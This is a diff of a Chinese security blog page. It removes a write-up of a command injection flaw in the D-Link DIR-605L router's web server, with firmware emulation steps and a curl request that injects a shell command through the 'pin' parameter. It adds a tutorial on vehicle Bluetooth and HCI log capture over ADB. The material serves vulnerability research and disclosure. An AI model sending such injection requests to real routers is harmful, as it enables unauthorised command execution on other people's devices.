@@ -9,7 +9,7 @@
     
     <title>
         
-            CNVD-2026-28535漏洞挖掘分享 |
+            车联网之蓝牙协议 |
         
         Zach0ry&#39;s home
     </title>
@@ -213,7 +213,7 @@
             <div class="post-content-bottom border-box">
                 
                     <div class="post-title">
-                        CNVD-2026-28535漏洞挖掘分享
+                        车联网之蓝牙协议
                     </div>
                 
 
@@ -241,13 +241,13 @@
         
             <span class="meta-info-item post-create-date">
                 <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
-                <span class="datetime">2026-07-23 14:00:00</span>
+                <span class="datetime">2026-08-16 10:03:16</span>
             </span>
 
             
                 <span class="meta-info-item post-update-date">
                     <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                    <span class="datetime" data-updated="Fri Jul 24 2026 09:45:34 GMT+0800">2026-07-24 09:45:34</span>
+                    <span class="datetime" data-updated="Wed Sep 09 2026 18:37:12 GMT+0800">2026-09-09 18:37:12</span>
                 </span>
             
         
@@ -256,7 +256,7 @@
             <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                 <ul class="post-category-ul">
                     
-                            <li class="category-item"><a href="/categories/IOT%E5%AE%89%E5%85%A8/">IOT安全</a></li>
+                            <li class="category-item"><a href="/categories/%E8%BD%A6%E8%81%94%E7%BD%91/">车联网</a></li>
                         
                     
                 </ul>
@@ -267,7 +267,7 @@
             <span class="post-tag meta-info-item border-box">
                 <ul class="post-tag-ul">
                     
-                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/IOT/">IOT</a></li>
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E8%93%9D%E7%89%99%E5%8D%8F%E8%AE%AE/">蓝牙协议</a></li>
                         
                     
                 </ul>
@@ -296,219 +296,130 @@
                     
 
                     
-                         <p>第一次自主漏洞挖掘，这里写一篇博客特此记录一下</p>
-<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p><a class="link"   target="_blank" rel="noopener" href="https://legacyfiles.us.dlink.com/DIR-605L/REVA/FIRMWARE/DIR-605L_REVA_FIRMWARE_1.13.ZIP" >固件地址<i class="fas fa-external-link-alt"></i></a></p>
-<p>漏洞文件：&#x2F;bin&#x2F;boa</p>
-<p>漏洞函数：start_wps()</p>
-<p>函数地址：0x45aa28</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260722205248908.png"
-                        alt="image-20260722205248908"
-                 ></p>
-<p>该函数的调用方式不太一样</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260723114533289.png"
-                        alt="image-20260723114533289"
-                 ></p>
-<p>HTTP请求-&gt;获取pin参数-&gt;start_wps()-&gt;sprintf拼接系统命令-&gt;system执行</p>
-<p>在函数中，程序首先通过：v2 &#x3D; *(_DWORD *)(a1 + 268)获取 HTTP 请求中的用户输入参数。</p>
-<p>然后通过：v3 &#x3D; strstr(v2,”pin&#x3D;”);查找用户提交的 PIN 参数。</p>
-<p>当参数存在时：wscd &#x3D; (const char *)(v3 + 4);获取用户可控内容。</p>
-<p>之后程序直接执行：sprintf(failed,”iwpriv wlan0 set_mib pin&#x3D;%s”,wscd);</p>
-<p>将用户输入拼接到系统命令中，最后：system(failed)执行该命令。</p>
-<p>由于用户输入未经过任何过滤，可以通过插入 Shell 特殊字符控制最终执行命令。</p>
-<h2 id="环境模拟"><a href="#环境模拟" class="headerlink" title="环境模拟"></a>环境模拟</h2><p>解包之后首先尝试运行</p>
-<p>看文件架构</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260723102257932.png"
-                        alt="image-20260723102257932"
-                 ></p>
-<p>拷贝合适的调试工具</p>
-<p><code>cp $(which qemu-mips-static ) .</code></p>
-<p>运行boa文件发现初始化错误</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260723102809099.png"
-                        alt="image-20260723102809099"
-                 > </p>
-<p>直接去ida查找报错字符<code>Initialize AP MIB failed!</code></p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260722195130210.png"
-                        alt="image-20260722195130210"
-                 ></p>
-<p>所以这里需要apmib_init返回true才能让函数继续执行</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260723102951467.png"
-                        alt="image-20260723102951467"
-                 > </p>
-<p>apmib_init()不在 boa 主程序里面，它来自外部动态库(.so)</p>
-<p>去找它的函数主体，在&#x2F;lib&#x2F;apmib.so文件中</p>
-<p>用ida打开</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/PixPin_2026-07-22_19-58-10.png"
-                        alt="PixPin_2026-07-22_19-58-10"
-                 ></p>
-<p>分析可知apmib_init()的作用：</p>
-<p>初始化路由器配置数据库（MIB），从Flash读取硬件配置、软件配置、用户配置，然后建立内存中的配置结构，供 boa 后面的 Web 页面调用。</p>
-<p>所以可以直接修改apmib_init函数执行函数，让它直接返回1</p>
-<p>创建apmib.c文件定义函数apmib_init（）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">int ampib_init(void)</span><br><span class="line">&#123;</span><br><span class="line">     //Fake it.</span><br><span class="line">     return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+                         <p><strong>蓝牙（Bluetooth）是一种短距离无线通信技术标准</strong>，用于在设备之间进行低功耗、低成本的数据传输。</p>
+<p>在车联网（IoV，Internet of Vehicles）里面，<strong>蓝牙主要不是用来“联网”的，而是作为车辆内部和车主设备之间的一种近距离通信入口</strong>。</p>
+<h2 id="BLE-是什么"><a href="#BLE-是什么" class="headerlink" title="BLE 是什么"></a>BLE 是什么</h2><p>Bluetooth Low Energy，简称 BLE，是面向低功耗、小数据量、周期性通信设计的蓝牙体系。它与经典蓝牙 BR&#x2F;EDR 共用 2.4 GHz 频段，但协议、连接方式和常见用途不同。</p>
+<table>
+<thead>
+<tr>
+<th>对比项</th>
+<th>BLE</th>
+<th>经典蓝牙 BR&#x2F;EDR</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>典型用途</td>
+<td>传感器、车钥匙、穿戴设备、控制器</td>
+<td>音乐、电话、键盘、文件传输</td>
+</tr>
+<tr>
+<td>功耗</td>
+<td>低，可长期电池供电</td>
+<td>相对更高</td>
+</tr>
+<tr>
+<td>主要数据模型</td>
+<td>GATT 服务与特征值</td>
+<td>Profile，如 A2DP、HFP、HID</td>
+</tr>
+<tr>
+<td>通信方式</td>
+<td>广播、扫描、连接、属性读写</td>
+<td>发现、配对、Profile 会话</td>
+</tr>
+</tbody></table>
+<p>BLE 使用 2.4 GHz ISM 频段和跳频通信，以降低干扰和衰落影响。 <a class="link"   target="_blank" rel="noopener" href="https://www.bluetooth.com/wp-content/uploads/Files/Specification/HTML/Core-62/out/en/low-energy-controller/radio-physical-layer-specification.html" >Bluetooth SIG 物理层规范<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="BLE通信流程"><a href="#BLE通信流程" class="headerlink" title="BLE通信流程"></a>BLE通信流程</h2><p><strong>第一步：广播</strong></p>
+<p>汽车BLE模块发送：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Advertising Packet</span><br></pre></td></tr></table></figure>
 
-<p>然后用gcc-mips-linux-gnu生成 MIPS 架构的 Linux 操作系统可执行文件</p>
-<p><code>mips-linux-gnu-gcc ./apmib.c -o apmib-ld.so -fPIC -shared</code></p>
-<p>之后重新运行</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot ./ \</span><br><span class="line">./qemu-mips-static \</span><br><span class="line">-E LD_PRELOAD=&quot;/apmib-ld.so&quot; \</span><br><span class="line">./bin/boa</span><br></pre></td></tr></table></figure>
+<p>里面可能包含：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">设备ID</span><br><span class="line">厂商ID</span><br><span class="line">Service UUID</span><br><span class="line">随机地址</span><br></pre></td></tr></table></figure>
 
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260723104810257.png"
-                        alt="image-20260723104810257"
-                 ></p>
-<p>qemu: uncaught target signal 11 (Segmentation fault) - core dumped</p>
-<p>ida调试去寻找报错位置</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot ./ \</span><br><span class="line">./qemu-mips-static \</span><br><span class="line">-E LD_PRELOAD=&quot;/apmib-ld.so&quot; \</span><br><span class="line">-g 1234 \</span><br><span class="line">./bin/boa</span><br></pre></td></tr></table></figure>
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BMW_xxxxx</span><br><span class="line">UUID: xxxx</span><br></pre></td></tr></table></figure>
+
+<p><strong>第二步：手机扫描</strong></p>
+<p>手机：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">扫描附近BLE设备</span><br></pre></td></tr></table></figure>
+
+<p>发现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vehicle BLE Device</span><br></pre></td></tr></table></figure>
+
+<p><strong>第三步：建立GATT连接</strong></p>
+<p>连接以后：</p>
+<p>结构：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GATT Server</span><br><span class="line">       |</span><br><span class="line">       |</span><br><span class="line">----------------</span><br><span class="line">Service</span><br><span class="line">       |</span><br><span class="line">Characteristic</span><br><span class="line">       |</span><br><span class="line">Value</span><br></pre></td></tr></table></figure>
+
+<p>汽车可能：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Digital Key Service</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line"> Authentication Characteristic</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line"> Door Control Characteristic</span><br></pre></td></tr></table></figure>
+
+<p><strong>第四步：认证</strong></p>
+<p>手机发送：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">challenge</span><br></pre></td></tr></table></figure>
+
+<p>车辆：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response</span><br></pre></td></tr></table></figure>
+
+<p>例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">手机:随机数123</span><br><span class="line">车辆:AES计算返回结果</span><br></pre></td></tr></table></figure>
+
+<p>认证成功：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unlock door</span><br></pre></td></tr></table></figure>
 
 
 
-<p>配置一下ida的远端调试信息</p>
-<p>hostname设置为虚拟机的ip,port为你起的那个端口</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260722200257340.png"
-                        alt="image-20260722200257340"
-                 ></p>
-<p>在apmib_get的跳转报错了</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260723105111125.png"
-                        alt="image-20260723105111125"
-                 ></p>
-<p>真正触发程序崩溃的是 0x43B1A4 处的指令</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260722202457645.png"
-                        alt="image-20260722202457645"
-                 > </p>
-<p>查看 apmib.so 中apmib_get()函数的汇编代码</p>
-<p>int __fastcall apmib_get(int n500, unsigned __int8 *p_boot_ver)</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260722202743083.png"
-                        alt="image-20260722202743083"
-                 > </p>
-<p>这个函数实际上是从路由器的配置数据库（MIB）里，根据编号 n500，把对应配置值读取出来，复制到调用者提供的缓冲区 p_boot_ver</p>
-<p>apmib_get(配置项编号, 存放结果的地址)</p>
-<p>分析调用的实际情况知道每个pid对应的是什么 </p>
-<p>所以修改函数apmib_init（）</p>
-<blockquote>
-<p>脚本中#define MIB_WPS_MODE 0x3B的情况是不是这里的读取信息，在之后对start_wps()函数的讲解会讲到</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#define MIB_IP_ADDR  170</span><br><span class="line">#define MIB_HW_VER   0x250</span><br><span class="line">#define MIB_CAPTCHA  0x2C1</span><br><span class="line">// WPS mode</span><br><span class="line">#define MIB_WPS_MODE 0x3B</span><br><span class="line">int apmib_init()</span><br><span class="line">&#123;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br><span class="line">// 防止boa初始化fork失败</span><br><span class="line">int fork(void)</span><br><span class="line">&#123;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">int apmib_get(int code, void *value)</span><br><span class="line">&#123;</span><br><span class="line">    int *v = (int *)value;</span><br><span class="line">    switch(code)</span><br><span class="line">    &#123;</span><br><span class="line">        // IP地址</span><br><span class="line">        case MIB_IP_ADDR:</span><br><span class="line">            *v = 0x7F000001;     //127.0.0.1</span><br><span class="line">            break;</span><br><span class="line">        // 硬件版本</span><br><span class="line">        case MIB_HW_VER:</span><br><span class="line">            *v = 0xF1;</span><br><span class="line">            break;</span><br><span class="line">        // 验证码</span><br><span class="line">        case MIB_CAPTCHA:</span><br><span class="line">            *v = 1;s</span><br><span class="line">            break;</span><br><span class="line">        // ★关键</span><br><span class="line">        // start_wps:</span><br><span class="line">        // apmib_get(0x3b,&amp;var)</span><br><span class="line">        //</span><br><span class="line">        // 0 -&gt; 进入:</span><br><span class="line">        // iwpriv wlan0 set_mib pin=%s</span><br><span class="line">        //</span><br><span class="line">        case MIB_WPS_MODE:</span><br><span class="line">            *v = 0;</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            // 默认返回成功</span><br><span class="line">            *v = 0;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><p><strong>前提</strong></p>
+<ul>
+<li>车机已开启 USB&#x2F;网络 ADB，且你能执行 <code>adb shell</code>。</li>
+<li>车辆静止、P 挡或台架环境。仅采集你自己的车机和测试蓝牙设备。</li>
+<li>不要执行陌生设备扫描、连接、配对或写入操作。</li>
+</ul>
+<p><strong>1. 确认 ADB 与系统信息</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">adb devices</span><br><span class="line">adb shell getprop ro.build.version.release</span><br><span class="line">adb shell getprop ro.product.model</span><br><span class="line">adb shell id</span><br><span class="line">adb shell getprop | findstr /i &quot;bluetooth btstack snoop&quot;</span><br></pre></td></tr></table></figure>
 
-<p>然后用gcc-mips-linux-gnu生成 MIPS 架构的 Linux 操作系统可执行文件</p>
-<p><code>mips-linux-gnu-gcc ./apmib.c -o apmib-ld.so -fPIC -shared</code></p>
-<p>然后就可以运行了</p>
-<p><code> sudo chroot ./ ./qemu-mips-static -E LD_PRELOAD=&quot;/apmib-ld.so&quot;  ./bin/boa</code></p>
-<p> <img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260723105150452.png"
-                        alt="image-20260723105150452"
-                 ></p>
-<p>但是跳转的页面是错的</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260723105220920.png"
-                        alt="image-20260723105220920"
-                 > </p>
-<p>需要改动 web 目录下的 first.asp 文件</p>
-<p>将代码 self.location.href&#x3D;”Basic&#x2F;Wizard_Easy_LangSelect.asp”;注释掉，</p>
-<p>然后将self.location.href&#x3D;”Basic&#x2F;Wizard_Easy_Welcome.asp”;复制到else 代码块</p>
-<p>即</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260723105452385.png"
-                        alt="image-20260723105452385"
-                 ></p>
-<p>之后就可以成功访问</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260723110100491.png"
-                        alt="image-20260723110100491"
-                 > 接着对start_wps函数进行详细分析</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260723120443884.png"
-                        alt="image-20260723120443884"
-                 ></p>
-<p>要想执行到system命令注入入口</p>
-<p>程序会对var&#x2F;run&#x2F;wscd-wlan0.pid和&#x2F;var&#x2F;tmp&#x2F;wscd_status两个文件进行校验，要先创建出这两个文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p var/run</span><br><span class="line">mkdir -p var/tmp</span><br><span class="line">touch var/run/wscd-wlan0.pid</span><br><span class="line">touch var/tmp/wscd_status</span><br></pre></td></tr></table></figure>
+<p>把车机蓝牙关闭后重新打开，避免旧会话混入日志。</p>
+<p><strong>2. 开启 HCI 日志</strong></p>
+<p>优先从车机开发者选项开启：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">设置 -&gt; 系统/开发者选项 -&gt; 启用蓝牙 HCI snoop 日志</span><br></pre></td></tr></table></figure>
 
-<p>并且传入参数中要以”pin&#x3D;····“的形式传入 </p>
-<p>且<code>apmib_get(59, &amp;n3);</code> 会获取wps配置，要继续修改apmib_get的函数伪造多一种判断情况</p>
-<p><code>#define MIB_WPS_MODE 0x3B</code></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#define MIB_IP_ADDR  170</span><br><span class="line">#define MIB_HW_VER   0x250</span><br><span class="line">#define MIB_CAPTCHA  0x2C1</span><br><span class="line">// WPS mode</span><br><span class="line">#define MIB_WPS_MODE 0x3B</span><br><span class="line">int apmib_init()</span><br><span class="line">&#123;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br><span class="line">// 防止boa初始化fork失败</span><br><span class="line">int fork(void)</span><br><span class="line">&#123;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line">int apmib_get(int code, void *value)</span><br><span class="line">&#123;</span><br><span class="line">    int *v = (int *)value;</span><br><span class="line">    switch(code)</span><br><span class="line">    &#123;</span><br><span class="line">        // IP地址</span><br><span class="line">        case MIB_IP_ADDR:</span><br><span class="line">            *v = 0x7F000001;     //127.0.0.1</span><br><span class="line">            break;</span><br><span class="line">        // 硬件版本</span><br><span class="line">        case MIB_HW_VER:</span><br><span class="line">            *v = 0xF1;</span><br><span class="line">            break;</span><br><span class="line">        // 验证码</span><br><span class="line">        case MIB_CAPTCHA:</span><br><span class="line">            *v = 1;</span><br><span class="line">            break;</span><br><span class="line">        case MIB_WPS_MODE:</span><br><span class="line">            *v = 0;</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            *v = 0;</span><br><span class="line">            break;</span><br><span class="line">    &#125;</span><br><span class="line">    return 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>开启后重启车机或至少重新开关蓝牙。部分 Android Automotive 车机把该选项隐藏；此时先检查日志是否已启用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb shell settings get global bluetooth_hci_log</span><br><span class="line">adb shell getprop persist.bluetooth.btsnooplogmode</span><br></pre></td></tr></table></figure>
 
-<p>之后就可以尝试运行了</p>
-<h2 id="模拟攻击"><a href="#模拟攻击" class="headerlink" title="模拟攻击"></a>模拟攻击</h2><p>还是起服务但是可以在gdb中调试</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo chroot ./ ./qemu-mips-static \</span><br><span class="line">-E LD_PRELOAD=/apmib-ld.so \</span><br><span class="line">-g 1234 \</span><br><span class="line">./bin/boa</span><br></pre></td></tr></table></figure>
+<p><strong>3. 只执行一轮可控测试</strong></p>
+<p>使用你自己的 BLE 设备，例如 BLE 温湿度计、开发板或测试标签：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">开始记录时间</span><br><span class="line">-&gt; 打开车机蓝牙</span><br><span class="line">-&gt; 对自有设备完成一次配对</span><br><span class="line">-&gt; 连接</span><br><span class="line">-&gt; 读取一个公开状态值</span><br><span class="line">-&gt; 断开连接</span><br><span class="line">-&gt; 删除该设备的配对记录</span><br></pre></td></tr></table></figure>
 
-<p>另开一个窗口来调试</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-multiarch ./bin/boa</span><br><span class="line">set architecture mips</span><br><span class="line">target remote :1234</span><br></pre></td></tr></table></figure>
+<p>记录每个动作的时间点。Wireshark 中可以据此筛选对应会话，避免把历史连接误判为目标流量。</p>
+<p><strong>4. 查找并导出日志</strong></p>
+<p>常见位置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">adb shell ls -l /sdcard/btsnoop_hci.log</span><br><span class="line">adb shell ls -l /data/misc/bluetooth/logs/</span><br><span class="line">adb shell find /data/misc/bluetooth /sdcard -iname &quot;*btsnoop*&quot; 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 
-<p>在进入system函数之前下断点，方便观察system函数的参数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b *0x45ab80</span><br></pre></td></tr></table></figure>
+<p>若位于 SD 卡：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb pull /sdcard/btsnoop_hci.log .</span><br></pre></td></tr></table></figure>
 
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260723121054106.png"
-                        alt="image-20260723121054106"
-                 ></p>
-<p>之后按<code>c</code>让它继续运行，期间他会停住等待输入</p>
-<p>开另一个窗口发送参数（这里以echo&gt;&#x2F;var&#x2F;run&#x2F;cnvd_test为例去测试执行）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl --path-as-is \</span><br><span class="line">&#x27;http://127.0.0.1/Basic/wifisc_add_sta.asp?pin=12345678;echo&gt;/var/run/cnvd_test&#x27;</span><br></pre></td></tr></table></figure>
+<p>量产车机通常会限制 Shell 直接读取 <code>/data/misc/bluetooth/logs/</code>。不要尝试绕过系统权限；可使用车机厂商诊断导出功能，或在已授权的工程版本&#x2F;台架镜像中由维护方导出该日志。</p>
+<p><strong>5. Wireshark 分析</strong></p>
+<p>打开 <code>.log</code> 文件后，重点使用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">btsmp                         配对和加密协商</span><br><span class="line">btatt                         GATT 属性读写</span><br><span class="line">btgatt                        服务与特征值</span><br><span class="line">btl2cap                       逻辑信道</span><br><span class="line">bthci_evt                     HCI 事件</span><br></pre></td></tr></table></figure>
 
-
-
-<p>回到gdb调试窗口看参数</p>
-<p><img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260723121326353.png"
-                        alt="image-20260723121326353"
-                 ></p>
-<p>看到我们伪造的命令已注入，C让它执行命令</p>
-<p> <img  
-                       lazyload
-                       alt="image"
-                       data-src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20260723121456508.png"
-                        alt="image-20260723121456508"
-                 ></p>
-<p>命令注入漏洞实现 </p>
+<p>检查目标：</p>
+<ul>
+<li><code>btsmp</code>：是否进行配对、是否在加密前开放敏感服务。</li>
+<li><code>btatt</code>：哪些 Characteristic 可读、可写；写入前是否要求认证。</li>
+<li>广播数据：名称、Service UUID、厂商数据是否含固定 ID、序列号或用户信息。</li>
+<li><code>ATT Read Response</code>：是否存在明文敏感状态。</li>
+<li><code>ATT Write Request</code>：是否可由未认证连接发出影响功能的写操作。</li>
+<li>删除绑定后：重新连接时是否仍被自动信任，或旧会话是否残留。</li>
+</ul>
+<p><strong>结论判定</strong></p>
+<ul>
+<li>仅看到 MAC、名称、UUID：多为设备识别&#x2F;可追踪风险。</li>
+<li>未加密地看到账号、Token、固定密钥、序列号等：信息泄露。</li>
